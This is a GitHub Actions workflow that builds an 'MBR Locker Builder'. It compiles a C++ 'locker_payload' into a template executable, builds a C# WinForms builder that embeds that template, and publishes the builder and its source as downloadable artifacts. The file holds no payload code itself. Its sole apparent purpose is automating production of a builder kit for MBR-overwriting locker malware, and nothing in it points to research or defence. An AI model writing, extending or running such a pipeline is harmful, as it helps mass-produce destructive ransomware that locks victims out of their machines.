name: Build MBR Locker Builder

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Install NASM
      run: choco install nasm -y

    - name: Install Visual Studio Build Tools
      run: |
        choco install visualstudio2022buildtools -y
        choco install visualstudio2022-workload-vctools -y

    - name: Setup .NET
      uses: actions/setup-dotnet@v4
      with:
        dotnet-version: 6.0.x

    - name: Compile Template (locker_payload.exe)
      shell: cmd
      run: |
        cd template
        call "C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
        cl /EHsc /O2 /MT locker_payload.cpp user32.lib kernel32.lib advapi32.lib
        if exist locker_payload.exe (
          move locker_payload.exe ..\builder\Resources\template.exe
          echo Template compiled successfully
        ) else (
          echo Compilation failed!
          exit /b 1
        )

    - name: Build Builder (C# WinForms)
      shell: cmd
      run: |
        cd builder
        dotnet restore
        dotnet build -c Release -o ../output

    - name: Upload Builder (autonomous)
      uses: actions/upload-artifact@v4
      with:
        name: MbrLockerBuilder
        path: |
          output/
          !output/*.pdb
        if-no-files-found: error

    - name: Upload Source Code
      uses: actions/upload-artifact@v4
      with:
        name: SourceCode
        path: |
          builder/
          locker/
          template/
          README.md
        if-no-files-found: warn
